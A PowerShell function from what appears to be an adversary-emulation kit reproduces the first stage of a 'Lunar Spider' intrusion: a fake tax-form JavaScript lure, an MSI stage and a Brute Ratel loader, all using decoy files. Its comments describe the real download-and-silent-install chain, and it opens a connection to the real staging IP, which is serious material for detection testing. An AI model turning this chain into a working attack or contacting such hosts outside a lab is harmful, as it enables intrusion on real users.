# ============================================================================
# LUNAR SPIDER SIMULATION - PHASE 1: INITIAL ACCESS (Malvertising -> JS -> MSI)
# ============================================================================
# Simulates: malicious ad lures the victim to download an obfuscated JavaScript
# file masquerading as a tax form (Form_W-9_...js). The JS makes an HTTP request
# to hxxp://91.194.11[.]64/MSI.msi to fetch the next stage. The MSI runs a
# custom action: rundll32.exe upfilles.dll,stow (the Brute Ratel C4 loader).
# MITRE: T1189 Drive-by Compromise, T1204.002 Malicious File,
# T1027 Obfuscated Files, T1218.007 Msiexec, T1218.011 Rundll32
# ============================================================================

function Simulate-InitialAccess {
    param($SimPaths)

    Write-Host "[+] Phase 1: Initial Access - Malvertising / obfuscated JS -> MSI ..." -ForegroundColor Green

    # --- Simulate browser download history of the malicious tax-form JS ---
    $historyLog = @"
[Simulated browser navigation / download history - LunarSpiderSim]
https://www.google.com/search?q=irs+form+w-9+2024+download
[malicious ad click ->] hxxps://taxforms-download[.]click/w9
File download: Form_W-9_Ver-i40_53b043910-86g91352u7972-6495q3.js  (Downloads folder)
"@
    Set-Content -Path "$($SimPaths.Logs)\browser_history_sim.log" -Value $historyLog -Force

    # --- Land the (inert) obfuscated JS in the user's Downloads folder, as in report ---
    $jsName = "Form_W-9_Ver-i40_53b043910-86g91352u7972-6495q3.js"
    $downloads = "$env:USERPROFILE\Downloads"
    if (-not (Test-Path $downloads)) { New-Item -Path $downloads -ItemType Directory -Force | Out-Null }
    $jsPath = Join-Path $downloads $jsName

    # Heavily-obfuscated look: a tiny bit of "real" logic buried in filler comments,
    # matching the report's description. This script is INERT - the payload URL is a
    # commented string, never executed. It exists purely as a lure/IOC artifact.
    $jsContent = @'
/* ==== W-9 Request for Taxpayer Identification Number and Certification ==== */
/* filler filler filler filler filler filler filler filler filler filler    */
/* filler filler filler filler filler filler filler filler filler filler    */
var _0xpad = "lorem ipsum dolor sit amet consectetur adipiscing elit sed do";
/* filler filler filler filler filler filler filler filler filler filler    */
// SIMULATION ONLY - the real sample performed:
//   WScript.Shell -> MSXML2.XMLHTTP GET hxxp://91.194.11[.]64/MSI.msi
//   -> save to %TEMP%\MSI.msi -> msiexec /i %TEMP%\MSI.msi /qn
var _stageUrl = "hxxp://91.194.11[.]64/MSI.msi"; // DEFANGED - not fetched
/* filler filler filler filler filler filler filler filler filler filler    */
/* filler filler filler filler filler filler filler filler filler filler    */
WScript.Echo("W-9 form could not be opened. Please contact your administrator.");
'@
    Set-Content -Path $jsPath -Value $jsContent -Force
    Write-Host "    Dropped lure: $jsPath" -ForegroundColor DarkGray

    # --- DNS/connection telemetry toward the real MSI staging host ---
    Invoke-SafeNetworkAttempt -Target $Global:LunarIOCs.MsiStageIP -Port 80

    Write-SimEvent -EventId 1001 -Message "SIMULATION: malicious JS $jsName downloaded; requested hxxp://$($Global:LunarIOCs.MsiStageIP)/MSI.msi"

    # --- Stage MSI.msi in %TEMP% (the JS-fetched second stage) ---
    $msiPath = "$env:TEMP\MSI.msi"
    New-DecoyBinary -Path $msiPath -SizeBytes 1310720 | Out-Null

    # --- MSI drops upfilles.dll (embedded in disk1.cab) into ProgramData ---
    # upfilles.dll is the Brute Ratel C4 loader. We drop an inert placeholder with
    # the exact filename/path so YARA/IOC matching and Sysmon image-load telemetry
    # line up with the report. MD5 ccb6d3cb020f56758622911ddd2f1fcb (reference only).
    $upfilles = "$env:ALLUSERSPROFILE\upfilles.dll"
    New-DecoyBinary -Path $upfilles -SizeBytes 245760 | Out-Null

    # --- MSI custom action: rundll32.exe upfilles.dll,stow (real process-tree artifact) ---
    Write-Host "    Executing MSI custom action: rundll32 upfilles.dll,stow ..." -ForegroundColor DarkGray
    Invoke-BenignRundll32 -DllPath $upfilles -ExportName "stow"

    Write-SimEvent -EventId 1002 -Message "SIMULATION: MSI custom action executed 'rundll32 upfilles.dll,stow' (Brute Ratel C4 loader)"

    Write-Host "  [OK] Initial Access artifacts created (JS lure, MSI.msi, upfilles.dll)" -ForegroundColor Yellow
    return $upfilles
}
